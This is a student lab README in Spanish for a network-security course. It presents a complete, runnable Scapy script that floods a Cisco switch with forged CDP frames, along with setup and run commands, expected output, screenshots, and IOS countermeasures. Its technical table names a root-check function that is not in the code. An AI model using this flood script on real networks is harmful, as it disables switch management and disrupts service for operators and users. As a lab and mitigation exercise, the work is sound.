# 🌐 CDP Flood — Script de Ataque Automatizado DoS

<div align="center">

![Python](https://img.shields.io/badge/Python-3.10%2B-blue?style=for-the-badge&logo=python)
![Scapy](https://img.shields.io/badge/Scapy-2.5.0%2B-green?style=for-the-badge)
![Kali Linux](https://img.shields.io/badge/Kali_Linux-2024.x-purple?style=for-the-badge&logo=kalilinux)
![GNS3](https://img.shields.io/badge/GNS3-2.2.x-orange?style=for-the-badge)
![Licencia](https://img.shields.io/badge/Uso-Educativo-red?style=for-the-badge)

**Lab. Networking — Ataques DoS y Mitigación de Capa 2**

| Campo | Detalle |
|---|---|
| **Alumno** | Wilfri Solano Frias |
| **Matrícula** | 2024-2364 |
| **Asignatura** | Seguridad de Redes |

[📹 Video Demostrativo](https://youtu.be/L43TLI6w06o?si=EQB0W8h4c1NpTNgM)

</div>

---

## ⚠️ Advertencia Legal

> **Este script es exclusivamente para uso educativo en entornos de laboratorio controlados (GNS3 / EVE-NG).**
> Su ejecución en redes reales sin autorización explícita por escrito constituye un delito informático
> penalizado por las leyes de ciberseguridad. El autor no se responsabiliza del mal uso de esta herramienta.

---

## 📋 Tabla de Contenidos

- [Descripción](#descripción)
- [Funcionamiento del Ataque](#funcionamiento-del-ataque)
- [Topología de Red](#topología-de-red)
- [Requisitos](#requisitos)
- [Parámetros Configurables](#parámetros-configurables)
- [Uso](#uso)
- [Código del Script](#código-del-script)
- [Explicación Técnica](#explicación-técnica)
- [Evidencias](#evidencias)
- [Contramedidas](#contramedidas)
- [Referencias](#referencias)

---

## 📋 Descripción

Este script automatiza el ataque de **Denegación de Servicio (DoS)** mediante la explotación del protocolo **CDP (Cisco Discovery Protocol)**. El atacante inyecta miles de identidades falsas a través de tramas CDP malformadas, saturando la memoria y el procesamiento del switch, haciendo que sea imposible su administración.

### ¿Cómo funciona el ataque?

```
[Atacante - eth0]  →  Genera identidades CDP falsas
        ↓
    Crea 8,000 paquetes CDP con:
    · MAC origen  →  Incrementales únicas
    · Nombre dispositivo  →  Cisco-Falso-X
    · Puerto origen  →  GigabitEthernet0/0 a 0/23
        ↓
      Inyecta con sendpfast (tcpreplay a 50,000 pps)
        ↓
[Switch IOU1]  →  Procesa torrente de información
        ↓
[Resultado]  →  Congestionamiento del plano de control
                Tabla CDP desbordada
                Administración del switch congelada
```

---

## 🧱 Topología de Red

```
                    ┌─────────────┐
                    │   ROUTER1   │
                    │ 192.168.99.1│
                    └──────┬──────┘
                           │ e0/0
                    ┌──────┴──────┐
                    │    IOU1     │ ← Switch Cisco con CDP habilitado
                    │  (Switch)   │
                    └──┬────┬─────┘
              e0/0 (Troncal)│ e0/1 ← Puerto objetivo del ataque
                    │      │
             ┌──────┴──┐   │
             │ ROUTER  │   │
             └─────────┘   │
                    ┌──────┴──────┐
                    │  Atacante   │
                    │192.168.124.135
                    │  VLAN 1     │
                    └─────────────┘
```

### Tabla de Direccionamiento

| Dispositivo | Interfaz | Dirección IP | Máscara | VLAN | Rol |
|---|---|---|---|---|---|
| ROUTER1 | e0/0 | 192.168.99.1 | /24 | VLAN 1 | Gateway |
| IOU1 (Switch) | e0/0 | N/A | N/A | Troncal | Switch objetivo |
| **Atacante** | **eth0** | **192.168.124.135** | **/24** | **VLAN 1** | **Equipo atacante** |

---

## ⚙️ Requisitos

| Categoría | Requisito | Versión |
|---|---|---|
| Sistema Operativo | Kali Linux | 2024.x o superior |
| Lenguaje | Python | 3.10 o superior |
| Librería principal | Scapy | 2.5.0 o superior |
| Módulo Scapy | scapy.contrib.cdp | Incluido en Scapy |
| Herramienta auxiliar | tcpreplay | Última versión |
| Simulador de red | GNS3 / EVE-NG | 2.2.x o superior |
| Privilegios | root / sudo | Obligatorio |
| Dispositivo objetivo | Switch Cisco con CDP | CDP habilitado |

### Instalación de Dependencias

```bash
# Actualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar Scapy
pip install scapy

# Instalar tcpreplay (para sendpfast)
sudo apt install tcpreplay -y

# Verificar instalación
python3 -c "from scapy.all import *; print('Scapy listo')"
which tcpreplay
```

---

## 🔧 Parámetros Configurables

| Variable | Tipo | Valor por Defecto | Descripción |
|---|---|---|---|
| `MI_INTERFAZ_RED` | `str` | `eth0` | Interfaz de red para inyectar tramas CDP |
| `CANTIDAD_A_ENVIAR` | `int` | `8000` | Número total de paquetes CDP a inyectar |
| `pps` | `int` | `50000` | Paquetes por segundo (mediante tcpreplay) |
| `nombre_dispositivo` | `str` | `Cisco-Falso-X` | Identificador único del dispositivo falso |
| `puerto_origen` | `str` | `GigabitEthernet0/0-0/23` | Puerto simulado (rotación cíclica) |

---

## 🚀 Uso

```bash
# Clonar el repositorio
git clone https://github.com/wilfrisf-sudo/ataque_cdp_flood
cd ataque_cdp_flood

# Ejecutar con privilegios de root (obligatorio)
sudo python3 Ataque_CDP.py
```

### Salida esperada

```
[*] Preparando 8000 paquetes CDP malformados...
[+] Generando identidades falsas (Cisco-Falso-1 a Cisco-Falso-8000)...
[*] Inyectando con tcpreplay (50,000 pps)...
[+] Inundación CDP iniciada exitosamente.
[*] Presiona Ctrl+C para detener el ataque.
[+] Paquetes enviados: 8000/8000
[-] Ataque detenido.
```

---

## 📝 Código del Script

```python
#!/usr/bin/env python3
import time
from scapy.all import *
from scapy.contrib.cdp import *

def ataque_cdp_flood(interfaz="eth0", cantidad=8000, pps=50000):
    print(f"[*] Preparando {cantidad} paquetes CDP malformados...")
    
    paquetes = []
    
    # 1. Generar paquetes CDP con identidades falsas
    for i in range(cantidad):
        # MAC origen incremental única
        mac_origen = f"00:11:22:{i//256:02x}:{i%256:02x}:00"
        
        # Nombre dispositivo único
        nombre = f"Cisco-Falso-{i+1}"
        
        # Puerto origen (rotación)
        puerto = f"GigabitEthernet0/{i % 24}"
        
        # Construir trama CDP
        pkt = Ether(src=mac_origen, dst="01:00:0c:cc:cc:cc") / LLC() / SNAP()
        pkt = pkt / CDPv2_HDR(version=2, ttl=180)
        pkt = pkt / CDPMsgDeviceID(val=nombre)
        pkt = pkt / CDPMsgAddr(naddrs=1, addr=CDPAddrRecordIPv4(ip="192.168.1.1"))
        pkt = pkt / CDPMsgPortID(val=puerto)
        
        paquetes.append(pkt)
    
    print(f"[+] Generando identidades falsas ({nombre})...")
    print(f"[*] Inyectando con tcpreplay ({pps} pps)...")
    
    try:
        # 2. Enviar con sendpfast (delegado a tcpreplay)
        sendpfast(paquetes, iface=interfaz, pps=pps, loop=1)
        print(f"[+] Inundación CDP iniciada exitosamente.")
        print(f"[+] Paquetes enviados: {cantidad}/{cantidad}")
    except KeyboardInterrupt:
        print("\n[-] Ataque detenido por el usuario.")
    except Exception as e:
        print(f"[-] Error durante la inyección: {e}")

if __name__ == "__main__":
    import os
    if os.getuid() != 0:
        print("[-] ¡ERROR! Este script requiere privilegios de administrador.")
        print("[*] Por favor, ejecútalo usando: sudo python3 Ataque_CDP.py")
        exit(1)
    
    ataque_cdp_flood(interfaz="eth0", cantidad=8000, pps=50000)
```

---

## 🔍 Explicación Técnica del Funcionamiento

| # | Función / Bloque | Descripción Técnica |
|---|---|---|
| 1 | **Importaciones** | Carga `scapy.all` y `scapy.contrib.cdp` para manipular estructuras CDP |
| 2 | **`ataque_cdp_flood()`** | Función principal que coordina generación e inyección de paquetes |
| 3 | **Bucle de generación** | Crea 8,000 paquetes CDP únicos con MAC e identificadores variables |
| 4 | **`CDPv2_HDR`** | Encabezado CDP v2 con TTL 180 para simular dispositivo real |
| 5 | **`CDPMsgDeviceID`** | Identidad falsa única (Cisco-Falso-X) |
| 6 | **`CDPMsgAddr`** | Dirección IP ficticia para completar la falsificación |
| 7 | **`CDPMsgPortID`** | Puerto simulado en rotación (GigabitEthernet0/0 a 0/23) |
| 8 | **`sendpfast()`** | Inyección de alto rendimiento delegada a tcpreplay |
| 9 | **`pps=50000`** | Velocidad de inyección: 50,000 paquetes por segundo |
| 10 | **`verificacion_root()`** | Valida que el script tenga permisos de administrador |

---

## 📸 Evidencias del Ataque

### Evidencia 1 — Topología en GNS3

<img width="414" height="379" alt="imagen" src="https://github.com/user-attachments/assets/ba9d7946-e55e-468b-a482-3a6d5752f6af" />

*Diseño de la topología virtualizada con switch objetivo y atacante*

### Evidencia 2 — Estado Normal del CDP

<img width="827" height="233" alt="imagen" src="https://github.com/user-attachments/assets/7011bfdd-fa99-4671-a068-4155fe4e5bd4" />

*Tabla CDP normal antes del ataque con dispositivos legítimos*

### Evidencia 3 — Ejecución del Script

<img width="427" height="360" alt="imagen" src="https://github.com/user-attachments/assets/8a11f4f3-60a8-42f3-87e1-e43cc0809850" />

*Script inyectando miles de identidades falsas a alta velocidad*

### Evidencia 4 — Impacto en el Switch

<img width="651" height="441" alt="imagen" src="https://github.com/user-attachments/assets/f9836c05-34ab-47fb-b1af-0f1f6a32f49b" />

*Tabla CDP desbordada con miles de entradas falsas — administración congelada*

### Evidencia 5 — Aplicación de Contramedidas

<img width="443" height="68" alt="imagen" src="https://github.com/user-attachments/assets/959efb2f-5a4c-4962-9e1b-b792b4fcf03c" />

*CDP deshabilitado en puerto de acceso*

---

## 🛡️ Contramedidas y Mitigación

### Opción A: Desactivación Selectiva por Interfaz (Recomendada)

Deshabilita CDP únicamente en puertos de acceso (usuarios), manteniéndolo en enlaces troncales:

```ios
interface Ethernet0/1
 no cdp enable
end
```

### Opción B: Desactivación Global del Protocolo

Si la infraestructura no depende de CDP:

```ios
no cdp run
end
```

### Tabla de Contramedidas

| Medida | Descripción | Impacto |
|---|---|---|
| `no cdp enable` | Deshabilita CDP en puerto específico | **Bloquea el ataque** |
| `no cdp run` | Deshabilita CDP globalmente en el switch | Previene todos los ataques CDP |
| Limpieza de tabla | Ejecutar `clear cdp table` tras mitigación | Elimina entradas falsas |
| Monitoreo | Verificar `show cdp neighbors` regularmente | Detección temprana |

---

## 📚 Referencias

- [Cisco — Cisco Discovery Protocol (CDP)](https://www.cisco.com/c/en/us/support/docs/ios-nx-os-software/ios-software/12069-cdp-overview.html)
- [Scapy Documentation — CDP](https://scapy.readthedocs.io/)
- [GNS3 Documentation](https://docs.gns3.com/)

---

<div align="center">

**Wilfri Solano Frias · Matrícula 2024-2364 · Seguridad de Redes**

*Laboratorio desarrollado con fines exclusivamente educativos*

</div>
